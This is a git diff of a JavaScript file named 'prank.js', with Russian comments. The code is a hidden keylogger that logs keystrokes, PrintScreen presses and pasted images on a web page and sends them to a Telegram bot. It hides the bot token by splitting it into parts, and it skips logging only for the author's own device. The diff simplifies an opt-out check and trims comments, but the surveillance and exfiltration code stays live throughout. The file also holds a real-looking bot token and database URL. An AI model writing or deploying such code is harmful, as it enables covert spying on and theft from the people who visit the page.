@@ -1,26 +1,7 @@
 // prank.js
 (function() {
-    // Проверяем глобальную настройку из базы
-let isGlobalSultan = localStorage.getItem('is_sultan') === 'true';
-try {
-    const part1 = "8818384063:";
-    const part2 = "AAEEqTup6sgED-gYB_1tm";
-    const part3 = "cQKcXwi-UDE3lQ";
-    const BOT_TOKEN = part1 + part2 + part3;
-    // Нам нужно только слушать базу, инициализируем её
-    if (typeof firebase !== 'undefined' && !firebase.apps.length) {
-        firebase.initializeApp({
-            databaseURL: "https://our-tracker-3cbb5-default-rtdb.europe-west1.firebasedatabase.app"
-        });
-    }
-    if (typeof firebase !== 'undefined') {
-        firebase.database().ref('settings/sultan_mode').on('value', snap => {
-            if (snap.val() === true) isGlobalSultan = true;
-        });
-    }
-} catch(e) {}
-
-if (isGlobalSultan || window.location.search.includes('me')) return;
+    // Проверяем ТОЛЬКО локальную память устройства
+    if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;
 
     function sendTelegram(text) {
         const part1 = "8818384063:";
@@ -42,11 +23,10 @@ if (isGlobalSultan || window.location.search.includes('me')) return;
         keyBuffer = "";
     }
 
-    // 1. СЛУШАЕМ KEYDOWN (для обычных клавиш)
+    // 1. СЛУШАЕМ KEYDOWN
     document.addEventListener('keydown', function(event) {
         let key = event.key;
 
-        // Ловим PrintScreen по коду (так как event.key иногда равен 'Unidentified')
         if (event.code === 'PrintScreen' || event.key === 'PrintScreen') {
             sendTelegram(`📸 <b>Скриншот!</b>\nНажата клавиша PrintScreen.\nСтраница: ${window.location.pathname.split('/').pop()}`);
             return;
@@ -74,14 +54,14 @@ if (isGlobalSultan || window.location.search.includes('me')) return;
         }
     });
 
-    // 2. СЛУШАЕМ KEYUP (для PrintScreen, так как keydown часто блокируется)
+    // 2. СЛУШАЕМ KEYUP (для PrintScreen)
     document.addEventListener('keyup', function(event) {
         if (event.code === 'PrintScreen' || event.key === 'PrintScreen') {
             sendTelegram(`📸 <b>Скриншот!</b>\nНажата клавиша PrintScreen (keyup).\nСтраница: ${window.location.pathname.split('/').pop()}`);
         }
     });
 
-    // 3. СЛУШАЕМ PASTE (если она вставит скриншот)
+    // 3. СЛУШАЕМ PASTE
     document.addEventListener('paste', function(event) {
         if (event.clipboardData && event.clipboardData.items) {
             for (let i = 0; i < event.clipboardData.items.length; i++) {
@@ -94,7 +74,7 @@ if (isGlobalSultan || window.location.search.includes('me')) return;
 
     window.addEventListener('beforeunload', flushKeys);
 
-    // 4. ФОЛБЭК: ПОТЕРЯ ФОКУСА (работает, если винда перехватила скриншот)
+    // 4. ФОЛБЭК: ПОТЕРЯ ФОКУСА
     let blurStartTime = 0;
     window.addEventListener('blur', () => blurStartTime = Date.now());
     window.addEventListener('focus', function() {
